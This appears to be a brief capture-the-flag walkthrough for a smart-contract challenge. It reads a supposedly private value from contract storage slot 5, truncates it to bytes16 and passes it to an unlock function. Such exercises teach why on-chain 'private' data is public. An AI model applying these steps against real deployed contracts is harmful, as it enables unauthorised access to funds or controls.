1) await web3.eth.getStorageAt(instance, 5)

    '0x1ad7c145924fdbd46c5f14866ee9a913f174e7dbd3b50aaa0e6aec730c7ec2b8'


2) bytes32 casted to bytes16 --> remove 32 rightmost digits (16 bytes)

3) await contract.unlock("0x1ad7c145924fdbd46c5f14866ee9a913")
